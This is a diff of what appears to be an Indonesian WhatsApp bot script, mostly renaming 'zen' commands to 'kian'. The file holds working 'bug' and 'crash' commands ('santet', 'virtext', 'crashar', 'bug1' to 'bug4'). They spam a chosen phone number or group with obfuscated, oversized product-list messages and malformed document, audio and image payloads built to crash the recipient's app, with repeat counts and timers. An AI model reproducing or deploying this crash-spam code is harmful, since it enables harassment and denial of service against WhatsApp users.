ctId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+buttonkal}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});haikal['relayMessage'](m[_0x588892(0x1f3)],order['message'],{'messageId':order['key']['id']});
+function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','kian\x20AIZAK\x20BOYS','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt','6289514100332@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await haikal[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var order=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+buttonkal,'description':_0x588892(0x1fc)+buttonkal,'thumbnail':virgam,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+buttonkal}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});haikal['relayMessage'](m[_0x588892(0x1f3)],order['message'],{'messageId':order['key']['id']});
 }
 }
 break
 //=================================================//
-case 'zensantet': {
+case 'kiansantet': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
@@ -731,7 +718,7 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 //=================================================//
-case 'zensantetgc': {
+case 'kiansantetgc': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
@@ -754,12 +741,12 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 //=================================================//
-case 'ducu': case 'zenducu': {
+case 'ducu': case 'kianducu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
 haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© 𝙕𝙚𝙣𝙪𝘼𝙞𝙯𝙖𝙠 APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
@@ -767,12 +754,12 @@ haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', 
 }
 break
 //=================================================//
-case 'zendaca': case 'zendaca':  {
+case 'kiandaca': case 'kiandaca':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
  haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© 𝙕𝙚𝙣𝙪𝘼𝙞𝙯𝙖𝙠 APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
@@ -780,12 +767,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'zendocu': case 'zendraknes':  {
+case 'kiandocu': case 'kiandraknes':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "documentMessage": {
@@ -806,12 +793,12 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'duc': case 'zenslebew': case 'cumadocu': {
+case 'duc': case 'kianslebew': case 'cumadocu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "documentMessage": {
@@ -832,7 +819,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'zenvirtext1': case 'zenzsu': case 'crashar1': {
+case 'kianvirtext1': case 'kianzsu': case 'crashar1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -842,7 +829,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case 'zenvirtext2': case 'zentol': case 'crashar2': {
+case 'kianvirtext2': case 'kiantol': case 'crashar2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -852,7 +839,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case 'zenvirtext3': case 'zenmemek': case 'crashar3': {
+case 'kianvirtext3': case 'kianmemek': case 'crashar3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -862,7 +849,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case 'zenvirtext4': case 'zencontol': case 'crashar4': {
+case 'kianvirtext4': case 'kiancontol': case 'crashar4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -872,7 +859,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case 'zenvirtext5': case 'zentextv': case 'crashar5': {
+case 'kianvirtext5': case 'kiantextv': case 'crashar5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -882,7 +869,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case 'zenvirtext6': case 'zengas': case 'crashar6':{
+case 'kianvirtext6': case 'kiangas': case 'crashar6':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -892,7 +879,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case 'zenvirtext7': case 'zenvirtext': {
+case 'kianvirtext7': case 'kianvirtext': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -902,7 +889,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case 'zenvirtext8': case 'zenvirtext1': case 'crashar7':{
+case 'kianvirtext8': case 'kianvirtext1': case 'crashar7':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -912,7 +899,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case 'zenvirtext9': case 'zenvirtext2': case 'crashar8':{
+case 'kianvirtext9': case 'kianvirtext2': case 'crashar8':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -922,7 +909,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case 'zenvirtext10': case 'zenvirtext3': case 'crashar9': {
+case 'kianvirtext10': case 'kianvirtext3': case 'crashar9': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -933,12 +920,12 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 break
 //=================================================//
-case 'zenbug1': case 'zencrash': case 'crashar10':{
+case 'kianbug1': case 'kiancrash': case 'crashar10':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "audioMessage": {
@@ -959,12 +946,12 @@ haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 }
 break
 //=================================================//
-case 'zenbug2': case 'zencrash1': case 'crashar11': {
+case 'kianbug2': case 'kiancrash1': case 'crashar11': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -988,12 +975,12 @@ haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
 }
 break
 //=================================================//
-case 'zenbug3': case 'zencrash2': case 'crashar12': {
+case 'kianbug3': case 'kiancrash2': case 'crashar12': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1015,12 +1002,12 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'zenbug4': case 'zencrash3': case 'crashar13':{
+case 'kianbug4': case 'kiancrash3': case 'crashar13':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
